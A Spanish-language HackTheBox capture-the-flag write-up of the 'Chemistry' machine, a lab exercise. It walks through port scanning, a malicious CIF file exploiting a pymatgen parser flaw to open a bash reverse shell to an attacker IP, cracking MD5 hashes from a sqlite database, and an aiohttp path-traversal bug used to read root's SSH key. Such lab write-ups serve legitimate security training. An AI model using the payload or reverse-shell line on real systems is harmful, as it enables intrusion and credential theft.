---
title: HTB Chemistry Writeup
date: 2025-03-13 20:00:00 -05:00
author: retxus
categories: [HTB, Linux]
tags: [Linux, http, Upload CIF file to RCE, CVE-2024-23334, LFI, sqlite3, Cracking]
comments: false
image:
  path: /assets/img/HTB-Chemistry/Chemistry.png
---

Muy buenas con todos, el día de hoy voy a resolver la máquina `Chemistry` de HTB, espero que el procedimiento sea de su agrado y fácil de comprender.

## Reconocimiento

Primero vemos si tenemos conexión con la máquina y de paso gracias al `ttl` identificamos ante el tipo de máquina que estamos, en `linux` este suele ser de 64 y en `windows` de 128.

```bash
ping -c 1 10.10.11.38
PING 10.10.11.38 (10.10.11.38) 56(84) bytes of data.
64 bytes from 10.10.11.38: icmp_seq=1 ttl=63 time=159 ms

--- 10.10.11.38 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 158.555/158.555/158.555/0.000 ms
```

Vemos que el `ttl` de la máquina es de 63, el cual está próximo a 64 por ende nos encontramos ante una máquina `Linux`.

Ahora, con la herramienta `rustscan` lanzamos un escaneo en donde vamos a enumerar los puertos que se encuentran abiertos en la máquina.

```bash
rustscan -a 10.10.11.38 --ulimit 5000 -r 1-65535 -- -sS -sCV -Pn -oN target
```

Guardamos la información en un archivo. (Siempre se recomienda llevar registro de lo que se realiza)

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaPNsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fyNnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.0.3 (Python 3.9.5)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-title: Chemistry - Home
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Archivo CIF malicioso

Si nos dirigimos a la página `web` por el puerto `5000` vemos que podemos iniciar sesión o registrarnos, así que procedemos a registrarnos. Una vez ingresado el usuario vemos un apartado donde se puede subir archivos `.cif`, buscando un poco tenemos <a href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f">esto</a>, en donde nos dan un formato de ese tipo y lograr la ejecución de código malicioso (RCE).


```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'/bin/bash -i >& /dev/tcp/{YOUR_IP}/4444 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Nos ponemos en escucha con `nc` y subimos el archivo, una vez subido le damos a `view` y logramos ganar acceso como `app`

![](/assets/img/HTB-Chemistry/1_Chemistry.png)

Una vez dentro hacemos el tratamiento de la `tty`.

```bash
script /dev/null -c bash
Ctrl + z
stty raw -echo; fg
export TERM=xterm-256color
source /etc/skel/.bashrc
```

Para tener las proporciones adecuadas dentro de la `shell` en una ventana de nuestro terminal hacemos `stty size` y en la shell de la víctima ponemos `stty rows {YOUR_ROWS_NUMBER} columns {YOUR_COLUMNS_NUMBER}`.

## Movimiento lateral

Observamos dentro de la ruta `/home/app/instance` una base de datos de tipo `sqlite3`, nos conectamos a ella y vemos dentro una tabla `user` listamos su contenido y vemos unos usuarios con sus contraseñas en formato `MD5`, en <a href="https://crackstation.net/">esta</a> `web` podemos romper los `hashes`

![](/assets/img/HTB-Chemistry/2_Chemistry.png)

Vemos la contraseña del usuario `rosa` él cuál es válido a nivel de sistema, así que nos conectamos por `ssh`.

```bash
sshpass -p "unicorniosrosados" ssh rosa@10.10.11.38
```

Y una vez dentro con este usuario logramos ver el `user.txt`.

## Escalada de privilegios

Listando los procesos, vemos que el usuario `root` está ejecutando con `python` lo que parece ser un servidor `web`, si vemos los puertos abiertos en la máquina, vemos que internamente está abierto el puerto `8080`

![](/assets/img/HTB-Chemistry/3_Chemistry.png)

Si vemos con `curl` las cabeceras de respuestas tenemos lo siguiente:

```bash
curl -I http://127.0.0.1:8080

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Fri, 14 Mar 2025 01:05:35 GMT
Server: Python/3.9 aiohttp/3.9.1
```

Investigando sobre `aiohttp` se encontró <a href="https://security.snyk.io/vuln/SNYK-PYTHON-AIOHTTP-6209406">esto</a>, en donde nos explican sobre un `LFI`, bueno si suponemos que es root quien corre ese servicio, podemos tratar de listar archivos a los cuales no tenemos acceso. Según el `CVE` se atenta contra la ruta `statics` del servidor, pero parece que no existe, pero si usamos curl para lanzar una petición a la `web`, vemos `assets`, entonces vamos a probar allí.


Bueno tal parece que si se puede, entonces leemos la `id_rsa` de `root` y nos conectamos como dicho usuario para ver la `root.txt`.

![](/assets/img/HTB-Chemistry/4_Chemistry.png)
